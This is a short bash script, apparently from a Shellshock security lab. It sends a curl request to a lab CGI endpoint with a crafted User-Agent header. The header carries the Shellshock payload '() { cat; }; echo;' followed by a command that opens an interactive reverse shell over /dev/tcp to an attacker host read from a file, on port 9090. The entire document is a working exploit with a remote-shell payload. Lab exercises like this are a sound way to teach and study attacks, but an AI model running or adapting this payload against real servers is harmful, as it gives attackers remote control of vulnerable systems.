#!/bin/bash

host=$(cat host_address.txt)
curl -A " () { cat; }; echo; /bin/bash -i > /dev/tcp/${host}/9090 0<&1 2>&1" www.seedlab-shellshock.com/cgi-bin/vul.cgi
